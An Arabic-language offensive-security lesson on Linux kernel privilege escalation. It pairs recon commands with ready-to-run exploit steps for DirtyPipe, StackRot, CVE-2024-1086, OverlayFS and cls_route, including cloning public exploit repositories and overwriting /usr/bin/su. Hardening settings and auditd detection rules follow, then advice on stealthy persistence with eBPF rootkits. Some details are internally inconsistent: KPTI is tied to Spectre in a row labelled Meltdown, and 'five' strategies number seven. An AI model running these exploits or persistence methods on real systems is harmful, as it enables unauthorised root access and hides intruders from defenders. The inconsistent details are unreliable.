# تصعيد الصلاحيات عبر نواة نظام لينكس (Linux Kernel LPE)

بمجرد الحصول على وصول أولي (Low-priv shell) إلى نظام لينكس، تصبح نواة النظام (Kernel) هي البوابة الرئيسية للوصول إلى صلاحيات الجذر (Root). يستعرض هذا الدرس ثغرات CVE الحديثة في النواة والتي لا تزال فعالة في الأعوام 2024–2026، والركائز التقنية التي تعتمد عليها، بالإضافة إلى كيفية الكشف عنها أو منعها من قبل الفرق الدفاعية.

> [!warning] تحذير للاستخدام في المختبرات فقط
> استغلال ثغرات النواة قد يؤدي إلى انهيار النظام (System Crash). اختبر هذه الأدوات فقط في بيئات افتراضية (VMs) مخصصة أو مختبرات معزولة. أنظمة الإنتاج الفعلية غالباً ما تختلف في إعداداتها عن الافتراضات التي بُنيت عليها نماذج الاستغلال (PoC)، مما قد يؤدي إلى حالة Kernel Panic بدلاً من تصعيد الصلاحيات.

## الاستطلاع الأولي (Initial Recon) — تحديد إصدار النواة

```terminal
uname -r                       # معرفة إصدار النواة: 6.5.0-15-generic إلخ.
uname -a
cat /etc/os-release
arch                           # تحديد المعمارية: x86_64, aarch64
cat /proc/cmdline              # معاملات إقلاع النواة
cat /proc/version

# التحقق من تقنيات التخفيف النشطة (Mitigations)
cat /proc/sys/kernel/randomize_va_space   # 2 = تفعيل كامل لخاصية ASLR
cat /proc/sys/kernel/kptr_restrict        # 0 = تسريب العناوين؛ 2 = إخفاء العناوين
cat /proc/sys/kernel/dmesg_restrict
mount | grep -E 'kernel|cgroup'
zgrep -E 'CONFIG_(BPF|USER_NS|UNPRIVILEGED|SLAB_FREELIST|RANDOM)' /proc/config.gz 2>/dev/null
```

```terminal
# أدوات الفحص التلقائي
linpeas.sh -a | tee peas.out
linux-exploit-suggester.sh -k $(uname -r)
```

## تقنيات التخفيف (Mitigations) الواجب فهمها

| تقنية التخفيف | الغرض منها | فئة التجاوز (Bypass) |
|-----------|---------------|--------------|
| KASLR | منع العناوين الثابتة للنواة في الذاكرة | تسريبات المعلومات (عبر dmesg أو /proc) |
| SMEP | منع تنفيذ كود المستخدم (Userland) من سياق النواة | تقنيات ROP/JOP داخل النواة |
| SMAP | منع النواة من قراءة بيانات المستخدم | تقنيات Stack Pivot أو تسريبات kasan |
| KPTI (Meltdown) | عزل خرائط ذاكرة النواة عن فضاء المستخدم | لا يوجد (ضرورية فقط ضد هجمات Spectre) |
| `unprivileged_userns_clone=0` | منع إنشاء User Namespaces للمستخدمين العاديين | استغلال مسارات setuid الموجودة مسبقاً |
| `unprivileged_bpf_disabled=1` | منع ثغرات eBPF JIT | استغلال ثغرات العتاد أو تقنية io_uring |
| Lockdown integrity mode | منع تحميل موديلات النواة أو الوصول لـ /dev/mem | ثغرات Use-After-Free (UAF) لا تزال تعمل |

## CVE-2022-0847 — DirtyPipe

تسمح هذه الثغرة بالكتابة في أي ملف يمكن للمستخدم قراءته، حتى لو كان مخزناً في ذاكرة التخزين المؤقت (Page Cache)، بما في ذلك ملفات SUID الثنائية ← مما يمنح صلاحيات root فورية.

```terminal
# تصيب النواة من الإصدار 5.8 وحتى أقل من 5.16.11 / 5.15.25 / 5.10.102
gcc dirtypipe.c -o dp
./dp /usr/bin/su 0 'YjzVFRxd'   # تعديل فحص getpwnam()
su  # ← الوصول لصلاحيات root
```

> [!tip] الركيزة التقنية لثغرة DirtyPipe
> لم يتم مسح علم في ذاكرة الأنابيب المؤقتة (`PIPE_BUF_FLAG_CAN_MERGE`) بعد عملية `splice()` من ملف، مما جعل أي كتابة تالية في الأنبوب تنعكس مباشرة في ذاكرة تخزين الصفحات (Page Cache) الخاصة بالملف. لا حاجة لصلاحيات CAP_* أو Namespaces، فقط خطأ في مسح علم (Flag).

## CVE-2023-3269 — StackRot

تتعلق بهيكل البيانات Maple-tree وتؤدي إلى ثغرة Use-After-Free في إدارة الذاكرة (MM). يوفر الاستغلال تسريباً لـ KASLR وعملية كتابة عشوائية (WAW) ← root. تصيب الإصدارات من 6.1 إلى 6.4.

```terminal
# استخدام أدوات مساعدة لتهيئة الـ Slab
git clone https://github.com/lrh2000/StackRot && cd StackRot
make && ./exploit
id
```

## CVE-2024-1086 — nftables UAF (ثغرة شاملة)

ثغرة Use-After-Free في مكون `nf_tables` يمكن استغلالها عبر حزم netlink مصنعة بعناية. نظراً لأن خاصية `unprivileged_userns_clone=1` مفعلة افتراضياً في معظم التوزيعات حتى نهاية 2024، يمكن للمستخدمين العاديين تفعيل الثغرة بسهولة.

```terminal
# نموذج الاستغلال العام يدعم الإصدارات من 5.14 إلى 6.6
cd CVE-2024-1086
./compile.sh && ./exploit
# /tmp/.r ← الحصول على shell بصلاحيات root
```

## CVE-2024-26926 / CVE-2024-26581 — تقنيات io_uring و netfilter

أنتجت واجهة `io_uring` تدفقاً مستمراً من ثغرات LPE منذ عام 2022. إذا صادفت نواة قديمة لم يتم فيها تعطيل io_uring (`/proc/sys/kernel/io_uring_disabled` لا تساوي 2)، فتوقع وجود ثغرات قابلة للاستغلال. ينصح بتعطيلها في بيئات الإنتاج ما لم تكن هناك حاجة ماسة للأداء.

## CVE-2023-0386 — ثغرة تعيين الهوية في OverlayFS

فئة قديمة ومتجددة من الثغرات. يؤدي تركيب (Mount) نظام ملفات Overlay بمدخلات يتحكم بها المهاجم إلى تجاوز حدود uid namespaces والحصول على نسخة SUID root من الملفات.

```terminal
# تصيب الإصدارات من 5.11 إلى 6.2
git clone https://github.com/sxlmnwb/CVE-2023-0386 && cd CVE-2023-0386
make && ./exp
./fuse
```

## CVE-2022-2588 — ثغرة `cls_route` UAF

ثغرة قديمة ولكنها لا تزال تظهر في أنظمة RHEL/CentOS 7-8 بسبب تأخر التحديثات. يتم تفعيلها عبر مرشحات `tc filter`.

```terminal
# تتطلب صلاحيات CAP_NET_ADMIN داخل user namespace
unshare -Urn
tc qdisc add dev lo root handle 1: htb
tc filter add dev lo parent 1: handle 800::1 protocol ip prio 10 route ...
# تفعيل ثغرة UAF
```

## eBPF — فئة الأخطاء المتكررة

تمنح أخطاء مدقق (Verifier) برمجيات eBPF صلاحيات قراءة وكتابة عشوائية في ذاكرة النواة. يظهر خطأ جديد سنوياً في هذا المكون. التحصين الموصى به: ضبط `kernel.unprivileged_bpf_disabled=1`.

```terminal
# التحقق من سطح الهجوم
sysctl kernel.unprivileged_bpf_disabled
```

## تصعيد الصلاحيات في سياق الحاويات (Containers)

حتى الحاويات تعمل بنفس نواة المضيف. يمكن استخدام `unshare -r` لاختبار سريع:

```terminal
# داخل الحاوية — نفس النواة المستخدمة في المضيف
unshare -Urnm
# إذا نجح الأمر، فلديك صلاحيات CAP_* داخل userns الجديد، وهو ما تحتاجه معظم نماذج الاستغلال (PoCs).
```

إذا كانت نواة المضيف هشّة، فإن الهروب من الحاوية يعني الحصول على root على المضيف بالكامل، بغض النظر عن قيود seccomp (لأن أخطاء النواة تتجاوز فلاتر syscalls).

## ركائز القنوات الجانبية (Side-channel)

- **تسريب kASLR عبر /proc/kallsyms:** إذا كانت قيمة `kptr_restrict=0` (هدية للمهاجم).
- **تسريب العناوين عبر dmesg:** شائع في أنظمة التصحيح (Debug Kernels) والأنظمة المدمجة.
- **توقيت القنوات الجانبية:** لكسر kASLR (مثل هجوم ENTRYBLEED).
- **الوصول إلى MSR:** عبر `/dev/cpu/*/msr` (يتطلب CAP_SYS_RAWIO ولكن يكسر kASLR فوراً).

## الدفاع — خمس استراتيجيات لتحصين النواة

1. **`kernel.unprivileged_userns_clone=0`**: يقتل فئة كاملة من ثغرات LPE التي تعتمد على user namespaces.
2. **`kernel.unprivileged_bpf_disabled=1`**: يغلق الباب أمام أخطاء مدقق eBPF.
3. **`kernel.io_uring_disabled=2`**: إلا إذا كانت هناك حاجة فعلية لها.
4. **`kernel.kptr_restrict=2` و `kernel.dmesg_restrict=1`**: لمنع تسريبات المعلومات الحساسة.
5. **`/proc/sys/kernel/yama/ptrace_scope=2`**: لتقييد هجمات التنقل الجانبي عبر ptrace.
6. **تفعيل Lockdown Mode**: عند استخدام Secure-boot.
7. **التحديث المستمر**: الاشتراك في نشرات التحديث (USN/RHSA) وتطبيق تحديثات النواة أسبوعياً بشكل تلقائي.

## أفكار لقواعد الكشف (Detection)

| نوع البيانات (Telemetry) | الإشارة التحذيرية |
|-----------|--------|
| تنفيذ `execve` لملفات SUID في `/tmp/.*` | احتمال كبير لعملية LPE |
| طلب `unshare(CLONE_NEWUSER)` من shell مستخدم | نادر جداً في بيئات الإنتاج، شائع في نماذج الاستغلال |
| رسائل Kernel oops/panic | محاولة استغلال فاشلة للنواة |
| ظهور ملف SUID جديد في `/tmp` أو `/dev/shm` | وضع ملف استغلال ثنائي (Exploit Binary) |
| انفجار مفاجئ في استدعاءات `bpf()` من مستخدم عادي | محاولة اكتشاف ثغرات eBPF |

```terminal
# قواعد تدقيق (auditd) مختصرة
auditctl -a always,exit -F arch=b64 -S unshare -k unshare
auditctl -a always,exit -F arch=b64 -S bpf -k bpf
auditctl -a always,exit -F arch=b64 -S setuid -F a0=0 -k root_setuid
```

## ما بعد الحصول على صلاحيات root

يغطي درس ما بعد الاختراق موضوع الثبات، ولكن التحركات الخاصة بالنواة تشمل:

- تجنب تحميل موديلات النواة (Kernel Modules) أو rootkits إلا عند الضرورة القصوى لأنها تترك أثراً كبيراً.
- تفضيل الثبات في فضاء المستخدم (cron, systemd, SUID dropbear) لسهولة تنظيفها بعد انتهاء المهمة.
- للمهام طويلة الأمد، فكر في استخدام rootkit يعتمد على eBPF (مثل kovid أو ebpfkit) حيث يصعب كشفه دون أدوات متخصصة.

> [!info] معظم المهام لا تتطلب ثغرات 0-day
> إذا كان الهدف يعمل بإصدار قديم من النواة (مثل 5.4.x أو 5.10.x LTS) دون رقع أمنية حديثة، فإن نماذج الاستغلال العامة ستعمل بنجاح. تشير البيانات الواقعية إلى أن 60% من أنظمة لينكس المخترقة كانت تحتوي على ثغرات LPE معروفة ومتاحة للجمهور. سرعة الترقيع أهم من البحث عن ثغرات جديدة.
